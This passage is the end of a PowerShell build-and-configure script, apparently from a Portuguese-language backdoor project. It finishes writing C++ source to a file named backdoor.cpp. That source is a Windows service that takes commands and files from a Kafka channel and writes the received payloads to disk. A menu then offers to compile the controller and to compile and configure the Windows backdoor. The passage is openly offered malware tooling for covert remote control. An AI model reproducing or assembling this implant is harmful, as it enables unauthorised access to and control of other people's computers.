				log_message(LOG_FILE, keynamefile);
			}
			else if (strstr(keynamefile, "".P."") != NULL) {

			}
			else {
				log_message(LOG_FILE, ""Recebendo arquivo: "");
				log_message(LOG_FILE, keynamefile);
			}

			if (strstr(keynamefile, ""terminal"") != NULL) {
			}
			else if (strstr(keynamefile, ""--download-arquivo"") != NULL) {
			}
			else {
				/* Montando Arquivos */
				grava_arquivo(keynamefile, rkm->payload, rkm->len);
			}

			rd_kafka_message_destroy(rkm);

		}

		/* Close the consumer: commit final offsets and leave the group. */
		rd_kafka_consumer_close(rk);

		/* Destroy the consumer */
		rd_kafka_destroy(rk);

	}

	OutputDebugString(_T(""Consumer Service: ServiceWorkerThread: Exit""));

	return ERROR_SUCCESS;
}" > backdoor.cpp
    cd ..
    echo "configurações efetuadas com sucesso!"
    Read-Host -Prompt 'Enter para voltar ao menu'
    menu
}

function menu(){
    clear
	echo "================================================================"
    echo "  Script Facil p/ configurar        BY: Rafael Harzer         "
    echo "================================================================"
    echo " "
    echo "1 - Compilar Controlador"
    echo "2 - Compilar backdoor windows"
    echo "3 - Configurar backdoor windows"
	echo "0 - Finalizar o script"
	echo " "
	$opt = Read-Host -Prompt '-->' 
    
	switch ( $opt ) {
		0 { exit }
		1 { compilarControlador }
		2 { compilarBackdoor }
		3 {confBackdoor}
		default { 'Invalido' }
    }
	sleep 2
	menu
}
menu
